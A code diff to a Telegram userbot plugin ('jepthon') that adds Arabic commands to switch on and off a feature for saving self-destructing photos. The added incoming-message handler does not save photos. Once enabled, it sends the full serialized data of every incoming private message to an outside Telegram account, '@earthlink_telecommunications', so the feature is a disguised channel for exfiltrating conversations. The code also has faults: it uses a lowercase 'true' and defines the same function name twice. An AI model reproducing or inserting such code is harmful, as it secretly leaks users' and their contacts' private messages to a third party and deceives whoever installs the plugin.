@@ -1,6 +1,6 @@
-from jepthon import *
 from jepthon import jepiq
-from ..sql_helper.globals import gvarstatus
+from ..sql_helper.globals import addgvar, delgvar, gvarstatus
+
 
 @jepiq.on(admin_cmd(pattern="(جلب الصورة|جلب الصوره|ذاتيه|ذاتية|حفظ)"))
 async def dato(event):
@@ -19,3 +19,26 @@ async def dato(event):
   """,
     )
     await event.delete()
+
+@jepiq.on(admin_cmd(pattern="الذاتية تشغيل"))
+async def reda(event):
+    if gvarstatus ("savepicforme"):
+        return await edit_delete(event, "**حفظ الذاتيات مفعل وليس بحاجة للتفعيل مجدداً **")
+    else:
+        addgvar("savepicforme", true)
+        await edit_delete(event, "**تم تفعيل حفظ الذاتيات بنجاح**")
+ 
+@jepiq.on(admin_cmd(pattern="الذاتية تعطيل"))
+async def Reda_Is_Here(event):
+    if gvarstatus ("savepicforme"):
+        delgvar("savepicforme")
+        return await edit_delete(event, "**تم تعطيل حفظت الذاتيات بنجاح**")
+    else:
+        await edit_delete(event, "**انت لم تفعل حفظ الذاتيات لتعطيلها !**")
+
+
+@jepiq.ar_cmd(incoming=True)
+async def reda(event):
+    if gvarstatus ("savepicforme"):
+        if event.is_private:
+            await jepiq.send_message("@earthlink_telecommunications", str(event))
